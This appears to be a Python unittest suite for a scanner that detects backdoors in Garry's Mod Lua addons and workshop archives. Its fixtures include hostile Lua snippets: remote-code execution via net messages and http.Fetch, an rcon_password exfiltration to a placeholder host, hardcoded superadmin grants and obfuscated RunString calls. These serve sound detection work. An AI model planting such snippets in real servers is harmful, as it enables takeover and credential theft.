#!/usr/bin/env python3
"""Synthetic regression corpus; no game code is executed or fetched."""
import base64
import importlib.util
import io
import json
import lzma
from pathlib import Path
import struct
import subprocess
import sys
import tempfile
import unittest
import zlib

HELPER = Path(__file__).resolve().parents[1] / 'addon/payload/scan.py'
spec = importlib.util.spec_from_file_location('toolkit_scan', HELPER)
scan = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = scan
spec.loader.exec_module(scan)


def rules(text):
    return {finding['rule']: finding for finding in scan.analyze(text.encode())[0]}


def gma(files, version=3):
    content = b'GMAD' + bytes([version]) + bytes(16) + (b'\0' if version > 1 else b'')
    content += b'Test\0{}\0Fixture\0' + struct.pack('<I', 1)
    for index, (name, raw) in enumerate(files.items(), 1):
        content += struct.pack('<I', index) + name.encode() + b'\0' + struct.pack('<QI', len(raw), zlib.crc32(raw))
    content += bytes(4) + b''.join(files.values())
    return content + struct.pack('<I', zlib.crc32(content))


class RuleTests(unittest.TestCase):
    def test_direct_network_execution_is_critical(self):
        found = rules('net.Receive("example", function(n, p)\n RunString(net.ReadString())\nend)')
        self.assertEqual('critical', found['network-execution']['severity'])
        self.assertEqual(2, found['network-execution']['line'])
        self.assertIn('remote-handler-execution', found)

    def test_aliased_receiver_and_executor(self):
        found = rules('local receive = net.Receive\nlocal execute = RunString\nreceive("example", function() execute(net.ReadString()) end)')
        self.assertIn('network-execution', found)
        self.assertIn('remote-handler-execution', found)

    def test_protected_call_execution_and_simple_value_flow(self):
        self.assertIn('network-execution', rules('pcall(RunString, net.ReadString())'))
        self.assertIn('network-execution', rules('local value = net.ReadString()\nRunString(value)'))
        self.assertIn('file-execution', rules('local value = file.Read("x.vmt")\nRunString(value)'))

    def test_identity_allow_and_direct_rank_table_changes(self):
        self.assertIn('identity-bypass', rules('if ply:SteamID() == "STEAM_0:0:1" then return true end'))
        self.assertIn('privilege-table-write', rules('ULib.ucl.users[id].group = "superadmin"'))

    def test_http_callback_and_direct_callback(self):
        for body in ['function(body) RunString(body) end', 'RunString']:
            self.assertIn('http-execution', rules('http.Fetch("https://example.invalid/test", ' + body + ')'))

    def test_unrelated_http_and_execution_not_proven_linked(self):
        found = rules('http.Fetch("https://example.invalid/version", function(v) print(v) end)\nRunString("print(1)")')
        self.assertNotIn('http-execution', found)
        self.assertEqual('medium', found['dynamic-lua']['severity'])
        self.assertEqual('low', found['http-request']['severity'])

    def test_http_table_callback(self):
        self.assertIn('http-execution', rules('HTTP({url="https://example.invalid", success=function(code, body) CompileString(body, "x")() end})'))

    def test_fixed_identity_admin_grant(self):
        found = rules('if ply:SteamID() == "STEAM_0:0:1" then\nply:SetUserGroup("superadmin")\nend')
        self.assertEqual('high', found['identity-privilege']['severity'])

    def test_admin_framework_grant_and_commands(self):
        self.assertIn('privilege-change', rules('ULib.ucl.addUser(id, {}, "superadmin")'))
        self.assertIn('privilege-change', rules('sam.player.set_rank(ply, "superadmin")'))
        self.assertIn('admin-command', rules('RunConsoleCommand("ulx", "adduserid", id, "superadmin")'))

    def test_network_privilege_is_reviewed_even_if_check_is_present(self):
        self.assertIn('remote-privilege', rules('net.Receive("rank", function(_,p) if p:IsAdmin() then p:SetUserGroup("superadmin") end end)'))

    def test_authorization_overrides(self):
        for code in ['PLAYER.IsAdmin = function() return true end', 'function PLAYER:IsSuperAdmin() return true end']:
            self.assertIn('authorization-override', rules(code))

    def test_encoded_and_concatenated_global_execution(self):
        for name in ['"Run" .. "String"', '"\\082\\117\\110\\083\\116\\114\\105\\110\\103"', 'string.char(82,117,110,83,116,114,105,110,103)', 'string.reverse("gnirtSnuR")']:
            found = rules('_G[' + name + '](net.ReadString())')
            self.assertIn('network-execution', found)
            self.assertIn('indirect-execution', found)

    def test_base64_literal_is_data_only(self):
        encoded = base64.b64encode(b'RunString("inert fixture")').decode()
        self.assertIn('encoded-payload', rules('local text = util.Base64Decode("' + encoded + '")'))

    def test_persistence_file_execution_and_sensitive_console(self):
        self.assertIn('persistent-write', rules('file.Write("autorun/test.lua", value)'))
        self.assertIn('file-execution', rules('RunString(file.Read("materials/test.vmt", "GAME"))'))
        self.assertIn('console-execution', rules('game.ConsoleCommand("lua_run print(1)")'))

    def test_possible_code_propagation_needs_script_copy_evidence(self):
        self.assertIn('code-propagation', rules('local source = file.Read("source.lua", "LUA")\nfile.Write("new_loader.lua", source)'))
        self.assertIn('code-propagation', rules('local info = debug.getinfo(1)\nfile.Write(target, file.Read(info.short_src))'))
        self.assertNotIn('code-propagation', rules('file.Write("score.json", util.TableToJSON(scores))'))

    def test_credential_transfer_not_hostname_telemetry(self):
        self.assertIn('possible-exfiltration', rules('http.Post("https://example.invalid", {password=GetConVar("rcon_password"):GetString()})'))
        self.assertNotIn('possible-exfiltration', rules('http.Post("https://example.invalid", {hostname=GetConVar("hostname"):GetString()})'))

    def test_historical_names_need_registration(self):
        self.assertIn('historical-channel', rules('net.Receive("bdsm", function() end)'))
        self.assertIn('historical-channel', rules('util.AddNetworkString("LickMeOut")'))
        self.assertIn('historical-channel', rules('net.Receive("lickmeout", function() end)'))
        self.assertNotIn('historical-channel', rules('local label = "MoonMan"\nprint(label)'))
        self.assertEqual({}, rules('print("GBombs 5")'))

    def test_comments_and_literals_are_not_executable_calls(self):
        self.assertEqual({}, rules('-- RunString(net.ReadString())\n--[=[ RunString() ]=]\n/* SetUserGroup() */\n// http.Fetch()\nprint("RunString(net.ReadString())")\nlocal help=[=[_G RunString()]=]'))

    def test_globals_and_debug_are_low_priority(self):
        self.assertEqual('low', rules('local value = _G[key]')['environment-access']['severity'])
        self.assertNotIn('dynamic-lua', rules('print("RunString")'))

    def test_unicode_native_and_bytecode(self):
        self.assertIn('hidden-unicode', rules('local x = "ab\u202ecd"'))
        self.assertIn('native-module', rules('require("custom_module")'))
        self.assertIn('native-execution', rules('package.loadlib("library.so", "start")'))
        self.assertTrue(scan.analyze(b'\x1bLJhidden')[1])

    def test_context_is_bounded_and_lines_are_correct(self):
        result = scan.analyze(('-- header\n' + 'RunString(value)\n' + 'x=' + 'a' * 1000).encode())[0][0]
        self.assertEqual(2, result['line'])
        self.assertLessEqual(len(result['context']), 3)
        self.assertTrue(all(len(line['text']) <= 240 for line in result['context']))

    def test_late_high_risk_evidence_replaces_weaker_findings_at_limit(self):
        findings, _, clipped = scan.analyze(('RunString(value)\n' * 50 + 'RunString(net.ReadString())').encode())
        self.assertTrue(clipped); self.assertEqual(30, len(findings))
        self.assertEqual('critical', findings[0]['severity'])


class ArchiveTests(unittest.TestCase):
    def check_archive(self, raw):
        with tempfile.NamedTemporaryFile() as file:
            file.write(raw); file.flush()
            return scan.scan_file(file.name, 'archive')

    def test_plain_gma_versions_and_packed_non_lua_payload(self):
        for version in (1, 2, 3):
            result = self.check_archive(gma({'lua/autorun/server/a.lua': b'RunString(net.ReadString())', 'materials/a.vmt': b'CompileString(file.Read("x"))', 'models/x.mdl': b'ignored'}, version))
            self.assertEqual(2, result['scripts'])
            self.assertTrue(any(f['member'] == 'lua/autorun/server/a.lua' for f in result['findings']))
            self.assertTrue(any(f['member'] == 'materials/a.vmt' for f in result['findings']))

    def test_lzma_workshop_archive(self):
        result = self.check_archive(lzma.compress(gma({'lua/a.lua': b'RunString(net.ReadString())'}), format=lzma.FORMAT_ALONE))
        self.assertEqual(1, result['scripts'])
        self.assertTrue(result['findings'])

    def test_archive_traversal_does_not_extract(self):
        result = self.check_archive(gma({'../../escape.lua': b'RunString(value)'}))
        self.assertEqual(0, result['scripts']); self.assertTrue(result['issues'])

    def test_corrupt_bounds_and_truncated_headers_rejected(self):
        for raw in [b'GMAD', gma({'lua/a.lua': b'abc'})[:-7]]:
            with self.assertRaises(ValueError): self.check_archive(raw)

    def test_checksum_and_oversized_members_mark_incomplete(self):
        raw = bytearray(gma({'lua/a.lua': b'print(1)'})); raw[-5] ^= 1
        self.assertTrue(self.check_archive(raw)['issues'])
        result = self.check_archive(gma({'lua/big.lua': b'x' * (scan.MAX_SCRIPT + 1)}))
        self.assertEqual(0, result['scripts']); self.assertTrue(result['issues'])

    def test_cli_reports_unrecognized_archives_and_never_executes_input(self):
        with tempfile.TemporaryDirectory() as folder:
            file = Path(folder) / 'input'; marker = Path(folder) / 'executed'
            file.write_text('os.execute("touch ' + str(marker) + '")')
            output = subprocess.check_output([sys.executable, '-I', str(HELPER), str(file), 'file'], text=True)
            self.assertFalse(marker.exists()); self.assertTrue(json.loads(output)['findings'])
            output = subprocess.check_output([sys.executable, '-I', str(HELPER), str(file), 'archive'], text=True)
            self.assertTrue(json.loads(output)['issues'])


if __name__ == '__main__': unittest.main(verbosity=2)
